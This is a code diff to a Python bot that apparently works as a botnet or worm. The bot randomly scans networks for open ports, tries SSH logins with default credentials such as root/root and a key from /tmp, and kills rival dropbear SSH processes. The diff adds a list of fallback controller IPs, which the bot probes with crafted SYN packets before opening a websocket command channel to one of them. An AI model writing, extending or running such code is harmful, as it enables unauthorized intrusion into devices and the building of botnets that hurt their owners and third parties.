@@ -18,10 +18,17 @@ from uuid import getnode as get_mac
 
 
 try:
-    MOD_IP = sys.argv[1]
+    MOD_ACTUAL_IP = sys.argv[1]
     OUR_DNS = sys.argv[2]
 except:
-    exit('MOD_IP or OUR_DNS value is not supplied.')
+    exit('MOD_ACTUAL_IP or OUR_DNS value is not supplied.')
+
+
+MOD_IP_LIST = [MOD_ACTUAL_IP, '192.168.1.152', '192.168.1.153', '192.168.1.154', 
+        '192.168.1.155', '192.168.1.156', '192.168.1.157', '192.168.1.158', 
+        '192.168.1.159', '192.168.1.160', '192.168.1.161', '192.168.1.162'
+        ] 
+MOD_IP = None
 
 LOADER_PORT = 8000
 MY_IP = "0.0.0.0"
@@ -104,7 +111,8 @@ def int_handler(sig, frame):
 
 # Kill ssh processes. 
 def kill_processes():
-    # SSH is not killed in init bot.
+    #os.system('pkill ssh')
+    os.system("kill -9 `ps ax | grep dropbear | grep -v grep | awk '{ print $1}'`")
     if os.path.isfile(LOCK_FILE):
         sys.exit("Already Running.")
     else:
@@ -148,7 +156,7 @@ class ssh_login(Thread):
         s = paramiko.SSHClient()
         s.load_system_host_keys()
         s.set_missing_host_key_policy(paramiko.WarningPolicy)
-            
+
         try:
             if self._uname == "root" and self._pwd == "root":
                 k = paramiko.RSAKey.from_private_key_file("/tmp/rps.pem")
@@ -231,7 +239,7 @@ async def login():
         else:
             pass
 
-        print('[D] Login Thread.')
+        #print('[D] Login Thread.')
 
         for ip in OPEN_IPS.keys():
             if OPEN_IPS[ip]['login'] is False:
@@ -272,7 +280,7 @@ async def scan():
             t_scan = tcp_scan(get_ip_address(choice(SCAN_NETWORK)), int(choice(SCAN_PORT)))       
             t_scan.start()
 
-        print("[D] OPEN_IPS: {}".format(OPEN_IPS))
+        #print("[D] OPEN_IPS: {}".format(OPEN_IPS))
         await asyncio.sleep(duration)
 
 # Process msg.
@@ -362,7 +370,24 @@ async def send_event(event, data):
 
 # Connect event.
 async def comm_connect():
-    global COMM_HANDLE, MY_ADDR, MOD_IP 
+    global COMM_HANDLE, MY_ADDR, MOD_IP
+
+    while MOD_IP is None:
+        shuffle(MOD_IP_LIST)
+            
+        for an_ip in MOD_IP_LIST:
+            
+            p = IP(dst = an_ip)/TCP(sport=RandShort(), dport=MOD_PORT, flags='S')    
+            resp = sr1(p, timeout=2, verbose=0)
+            if resp is None:
+                pass
+            elif resp.haslayer(TCP):
+                if resp.getlayer(TCP).flags == 0x12:
+                    MOD_IP = an_ip
+                    break
+                elif resp.getlayer(TCP).flags == 0x14:
+                    pass
+            
     try:
         COMM_HANDLE = await websockets.connect('ws://{}:{}/{}'.format(MOD_IP, MOD_PORT, MODULE))
         MY_ADDR = COMM_HANDLE.local_address[0]
